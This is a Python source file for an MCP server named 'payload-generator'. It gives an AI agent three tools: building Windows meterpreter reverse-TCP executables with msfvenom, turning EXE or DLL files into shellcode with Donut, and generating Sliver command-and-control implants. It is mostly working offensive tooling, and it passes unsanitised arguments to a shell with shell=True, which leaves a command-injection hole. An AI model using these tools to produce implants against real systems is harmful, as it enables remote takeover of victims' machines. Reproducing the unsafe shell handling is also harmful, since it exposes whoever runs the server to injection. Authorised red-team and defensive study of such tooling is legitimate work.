# mcp_payload_server.py
import asyncio
from mcp.server.fastmcp import FastMCP
from pydantic import BaseModel
import subprocess

mcp = FastMCP("payload-generator")


def execute(command: str) -> str:
    """Executes a shell command and returns output or error."""
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"[ERROR] {e.stderr.strip()}"


class MsfvenomArgs(BaseModel):
    payload: str
    lhost: str
    lport: int


@mcp.tool()
async def generate_msfvenom(req: MsfvenomArgs) -> str:
    """
    Generate a Windows payload using msfvenom.

    :param payload: Payload string (e.g., windows/x64/meterpreter/reverse_tcp)
    :type payload: str
    :param lhost: Local host IP for reverse connection
    :type lhost: str
    :param lport: Local port for reverse connection
    :type lport: int
    :return: Output of msfvenom execution
    :rtype: str
    """
    cmd = f"msfvenom -p {req.payload} LHOST={req.lhost} LPORT={req.lport} -f exe -o payload.exe"
    return execute(cmd)


class DonutArgs(BaseModel):
    file_path: str


@mcp.tool()
async def generate_donut(req: DonutArgs) -> str:
    """
    Generate shellcode from an EXE or DLL using Donut.

    :param file_path: Path to the executable or DLL file
    :type file_path: str
    :return: Output from Donut execution
    :rtype: str
    """
    return execute(f"donut {req.file_path}")


class SliverArgs(BaseModel):
    listener: str
    format: str = "shellcode"
    arch: str = "x64"


@mcp.tool()
async def generate_sliver(req: SliverArgs) -> str:
    """
    Generate a payload using Sliver.

    :param listener: Name of the listener configured in Sliver
    :type listener: str
    :param format: Payload format (e.g., shellcode, exe, macho)
    :type format: str
    :param arch: Target architecture (x64 or x86)
    :type arch: str
    :return: Output of Sliver client generation
    :rtype: str
    """
    cmd = f"sliver-client generate --listener {req.listener} --format {req.format} --arch {req.arch}"
    return execute(cmd)


if __name__ == "__main__":
    asyncio.run(mcp.run_stdio())
